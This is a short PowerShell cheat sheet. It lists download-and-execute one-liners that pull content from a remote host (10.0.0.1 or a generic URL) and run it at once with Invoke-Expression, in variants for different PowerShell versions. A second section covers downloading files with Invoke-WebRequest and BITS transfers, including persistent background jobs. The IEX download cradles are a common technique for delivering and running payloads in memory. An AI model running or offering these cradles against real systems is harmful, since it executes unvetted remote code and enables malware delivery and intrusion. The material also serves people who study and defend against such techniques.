## Uses for Invoke-Expression en Invoke-WebRequest, Invoke-RestMethod and WebClient and BitsTransfer

### Powershell Versions
```ps
$PSVersionTable
```
- Powershell 1.0 – Windows Vista / 2008
- Powershell 2.0 – Windows 7 / 2008 R2
- Powershell 3.0 – Windows 8 / 2012
- Powershell 4.0 – Windows 8.1 / 2012 R2
- Powershell 5.0 – Windows 10

### Powershell v1.0/v2.0
```ps
IEX (New-Object Net.WebClient).DownloadString('URL')
```

### Powershell v3.0 and later
```ps
Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | IEX
```
```ps
Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt' | IEX
```
```ps
IEX (Invoke-RestMethod -Method Get -Uri 'http://10.0.0.1/sysinfo.txt')
```
```ps
IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing)
```
```ps
Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing | Select-Object Content | IEX
```
```ps
IEX (Invoke-WebRequest -Uri 'http://10.0.0.1/sysinfo.txt' -UseBasicParsing).Content
```

### Another path for downloading files using BitsTransfer

Invoke-WebRequest
```ps
Invoke-WebRequest -Uri 'https://domain.com/myfile.ps1' -OutFile "C:\temp\myfile.ps1"
```

BitsTransfer synchronously
```ps
Start-BitsTransfer 'https://domain.com/myfile.ps1' -Destination "C:\temp\myfile.ps1"
```

BitsTransfer asynchronously
```ps
Start-BitsTransfer 'https://domain.com/myfile.ps1' -Destination "C:\temp\myfile.ps1" -Asynchronous
```

This adds a new job to the Bits background transfer service, this is persistent even if the PowerShell session is closed. In order to view the queued jobs we use *Get-BitsTransfer* and to complete the job and download the *Complete-BitsTransfer* file.
```ps
Get-BitsTransfer -Name "TestJob1" | Complete-BitsTransfer
```